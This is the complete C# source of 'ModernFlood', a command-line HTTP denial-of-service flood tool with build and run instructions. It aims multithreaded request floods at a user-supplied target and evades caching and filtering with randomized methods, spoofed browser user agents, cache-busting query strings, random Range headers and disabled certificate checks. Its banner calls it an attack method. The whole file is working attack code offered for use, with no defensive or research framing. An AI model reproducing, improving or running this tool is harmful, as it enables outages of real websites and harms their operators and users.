// ModernFlood.cs
// Compile: dotnet new console -n ModernFlood -f net8.0
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <duration> [threads] [rate_limit]

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class ModernFlood
{
    static readonly Random _rand = new Random();
    static string _target;
    static int _durationSec;
    static int _threads;
    static int _ratePerThread;

    // Attack features (all enabled by default)
    static readonly bool _slowloris = true;
    static readonly bool _rangeAttack = true;
    static readonly bool _cacheBypass = true;
    static readonly bool _http2Flood = true;
    static readonly bool _compressionBomb = true;

    static readonly string[] _userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    };

    static readonly string[] _methods = { "GET", "POST", "HEAD", "OPTIONS" };

    static async Task Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: ModernFlood <target> <duration> [threads] [rate_limit]");
            return;
        }

        _target = args[0];
        _durationSec = int.Parse(args[1]);
        _threads = args.Length > 2 ? int.Parse(args[2]) : Math.Min(Environment.ProcessorCount, 4);
        _ratePerThread = args.Length > 3 ? int.Parse(args[3]) : 64;

        if (!_target.StartsWith("http"))
            _target = "https://" + _target;

        Console.WriteLine("\n╔════════════════════════════════════════╗");
        Console.WriteLine("║      MODERN-FLOOD ATTACK METHOD       ║");
        Console.WriteLine("╚════════════════════════════════════════╝\n");
        Console.WriteLine($"Target       : {_target}");
        Console.WriteLine($"Duration     : {_durationSec} seconds");
        Console.WriteLine($"Threads      : {_threads}");
        Console.WriteLine($"Rate/Thread  : {_ratePerThread} req/s");
        Console.WriteLine($"Total Rate   : ~{_threads * _ratePerThread} req/s");
        Console.WriteLine("\nVulnerabilities Exploited:");
        Console.WriteLine($"  • HTTP/2 Flood         : {(_http2Flood ? "✓" : "✗")}");
        Console.WriteLine($"  • Slowloris            : {(_slowloris ? "✓" : "✗")}");
        Console.WriteLine($"  • Range Attack         : {(_rangeAttack ? "✓" : "✗")}");
        Console.WriteLine($"  • Cache Bypass         : {(_cacheBypass ? "✓" : "✗")}");
        Console.WriteLine($"  • Compression Bomb     : {(_compressionBomb ? "✓" : "✗")}");
        Console.WriteLine("\n[INFO] Launching attack...\n");

        var cts = new CancellationTokenSource();
        var tasks = new Task[_threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < _threads; i++)
        {
            int id = i;
            counters[id] = 0;
            tasks[i] = Task.Run(() => Worker(id, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[THREAD-{kv.Key+1}] RPS: {kv.Value}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[COMPLETE] Attack finished successfully.\n");
    }

    static async Task Worker(int id, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        var uri = new Uri(_target);
        bool useHttp2 = _http2Flood && uri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase);

        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = useHttp2,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        if (useHttp2)
            handler.DefaultVersionPolicy = HttpVersionPolicy.RequestVersionExact;

        using var client = new HttpClient(handler);
        // Keep connections alive for slowloris
        if (_slowloris)
            client.DefaultRequestHeaders.ConnectionClose = false;
        else
            client.DefaultRequestHeaders.ConnectionClose = true;

        // Base path & query handling
        string basePath = uri.PathAndQuery;
        if (string.IsNullOrEmpty(basePath)) basePath = "/";
        bool hasQuery = basePath.Contains('?');

        var sw = Stopwatch.StartNew();
        int intervalMs = 1000 / _ratePerThread;

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _durationSec)
        {
            // Random method
            string method = _methods[_rand.Next(_methods.Length)];
            var request = new HttpRequestMessage(new HttpMethod(method), BuildRequestUri(uri, basePath, hasQuery));

            // Apply headers
            request.Headers.UserAgent.ParseAdd(RandomUserAgent());
            request.Headers.Add("Accept", "*/*");
            request.Headers.Add("Accept-Encoding", _compressionBomb ? "gzip, deflate, br, compress" : "identity");
            request.Headers.Add("Cache-Control", _cacheBypass ? "no-cache, no-store, must-revalidate" : "max-age=0");
            request.Headers.Add("Pragma", "no-cache");
            request.Headers.Add("X-Requested-With", "XMLHttpRequest");
            request.Headers.Add("Origin", uri.GetLeftPart(UriPartial.Authority));
            request.Headers.Add("Referer", _target);

            // Range attack
            if (_rangeAttack && _rand.NextDouble() > 0.5)
            {
                long rangeStart = _rand.Next(0, 1_000_000);
                long rangeEnd = rangeStart + _rand.Next(100, 100_000);
                request.Headers.Range = new RangeHeaderValue(rangeStart, rangeEnd);
            }

            try
            {
                using var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, ct);
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch
            {
                // Ignore errors
            }

            await Task.Delay(intervalMs, ct);
        }
    }

    static string BuildRequestUri(Uri uri, string basePath, bool hasQuery)
    {
        // Cache‑busting parameters
        var cacheBuster = new Dictionary<string, string>
        {
            ["_"] = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds().ToString(),
            ["rand"] = RandomString(8),
            ["cb"] = RandomHex(4),
            ["t"] = _rand.Next().ToString("x")
        };
        string query = string.Join("&", cacheBuster.Select(kv => $"{kv.Key}={kv.Value}"));
        string fullPath = basePath + (hasQuery ? "&" : "?") + query;
        return $"{uri.Scheme}://{uri.Host}{fullPath}";
    }

    static string RandomUserAgent() => _userAgents[_rand.Next(_userAgents.Length)];
    static string RandomString(int length) => Convert.ToHexString(RandomNumberGenerator.GetBytes(length)).ToLower();
    static string RandomHex(int length) => Convert.ToHexString(RandomNumberGenerator.GetBytes(length)).ToLower();
}
